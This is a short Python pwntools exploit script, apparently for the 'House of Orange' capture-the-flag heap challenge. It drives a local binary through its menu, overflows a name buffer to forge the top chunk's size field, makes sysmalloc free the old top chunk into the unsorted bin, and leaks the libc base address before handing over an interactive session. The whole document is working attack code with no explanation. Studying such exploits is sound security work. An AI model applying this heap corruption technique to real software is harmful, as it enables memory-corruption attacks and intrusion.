from pwn import *

def build(length, name, price, color):
    p.sendlineafter("Your choice :", "1")
    p.sendlineafter("Length of name :", str(length))
    p.sendafter("Name :", name)
    p.sendlineafter("Price of Orange:", str(price))
    p.sendlineafter("Color of Orange:", str(color))

def leak():
    p.sendlineafter("Your choice :", "2")
    p.recvuntil(cyclic(0x8))
    return u64(p.recv(6).ljust(8, "\x00")) - 0x3c3b78

def upgrade(length, name, price, color):
    p.sendlineafter("Your choice :", "3")
    p.sendlineafter("Length of name :", str(length))
    p.sendafter("Name:", name)
    p.sendlineafter("Price of Orange: ", str(price))
    p.sendlineafter("Color of Orange:", str(color))

def pwn(p):
    build(0x18, cyclic(0x18), 8848, 0xddaa)
    
    # overwrite `sz` of top chunk
    upgrade(0x40, cyclic(0x38) + p64(0xfa1), 8848, 0xddaa)  # fake `sz`: 0xfa1

    # let sysmalloc() free the old top chunk into unsorted bin
    build(0x1000, cyclic(0x1000), 8848, 0xddaa)

    # ...so that we can leak from it
    build(0x8, cyclic(0x8), 8848, 0xddaa)
    libc = leak()
    success("libc base: " + hex(libc))
    p.interactive()

if __name__ == "__main__":
    p = process("./houseoforange")
    pwn(p)